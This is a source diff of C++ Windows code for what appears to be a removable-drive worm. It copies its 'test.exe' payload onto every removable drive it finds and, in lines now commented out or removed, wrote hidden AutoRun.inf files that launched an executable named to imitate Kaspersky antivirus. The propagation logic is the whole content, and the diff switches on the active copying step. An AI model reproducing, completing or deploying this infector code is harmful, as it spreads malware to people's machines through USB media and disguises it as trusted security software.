@@ -2,7 +2,6 @@
 #include <fstream>
 #include <iostream>
 
-using namespace std;
 
 const char *drive[]={ 
     "a:", "b:", "c:", "d:", "e:", "f:", "g:", "h:", "i:", "j:", "k:", "l:",
@@ -10,42 +9,57 @@ const char *drive[]={
     "y:", "z:", 0
 };
 
+const char payload[MAX_PATH]="\\test.exe";
+const char infector[MAX_PATH]="\\infector.exe";
+
 int FindDrv(const char *drive)
 {
     char dirX[MAX_PATH];
     char path[MAX_PATH];
     char autorun[MAX_PATH]="AutoRun.inf";
-    ofstream CreAut;
+    //std::ofstream CreAut;
     
+    //gets path of the current files
     HMODULE GetQ; 
     GetQ=GetModuleHandle(NULL);
     GetModuleFileName(GetQ,path,sizeof(path));
 
-    CreAut.open(dirX,ios_base::out);
-    CreAut<<"[AutoRun]"<<endl;
-    CreAut<<"open=Kasperrsky.exe"<<endl;
-    CreAut<<"shellexecute=Kasperrsky.exe"<<endl;
-    CreAut<<"shell\\Auto\\command=Kasperrsky.exe"<<endl;
-    CreAut<<"shell=Auto"<<endl;
-    CreAut.close();
+    std::string tempString = path;
+    std::string buff = tempString.substr(0, tempString.find_last_of("\\"));
+    strcpy(path, buff.c_str());
+    strcat(path, payload);
 
-    SetFileAttributes(dirX,FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_SYSTEM|FILE_ATTRIBUTE_READONLY);
+    //CreAut.open(dirX,std::ios_base::out);
+    //CreAut<<"[AutoRun]" << std::endl;
+    //CreAut<<"open=test.exe" << std::endl;
+    //CreAut<<"shellexecute=test.exe" << std::endl;
+    //CreAut<<"UseAutoPlay=1" << std::endl;
+    //CreAut<<"shell\\Auto\\command=test.exe" << std::endl;
+    //CreAut<<"shell=Auto" << std::endl;
+    //CreAut.close();
+    //SetFileAttributes(dirX,FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_SYSTEM|FILE_ATTRIBUTE_READONLY);
+
     UINT type= GetDriveType(drive);
-
+    
     if(type == DRIVE_REMOVABLE)
     {
-        //strcpy(dirX, drive);
-        //strcat(dirX, "\\");
-        //strcat(dirX, "Kasperrsky.exe");
+        strcpy(dirX, drive);
+        strcat(dirX, "\\");
+        strcat(dirX, "test.exe");
 
-        //CopyFile(path,dirX,TRUE); 
-        std::cout << "Detected removable" << std::endl;
+        //std::cout << "path: " << path << std::endl;
+        //std::cout << "dirX: " << dirX << std::endl;
+
+        CopyFile(path,dirX,TRUE); 
+        SetFileAttributes(path,FILE_ATTRIBUTE_NORMAL|FILE_ATTRIBUTE_SYSTEM|FILE_ATTRIBUTE_READONLY);
         //strcpy(dirX, drive);
         //strcat(dirX, "\\" );
         //strcat(dirX, autorun);
+        //std::cout << "dirX: " << dirX << std::endl << std::endl << std::endl;
+
         return 0;
     } else {
-        std::cout << "Not detected removable" << std::endl;
+        //std::cout << "Not detected removable" << std::endl;
     }
     return 0;
  
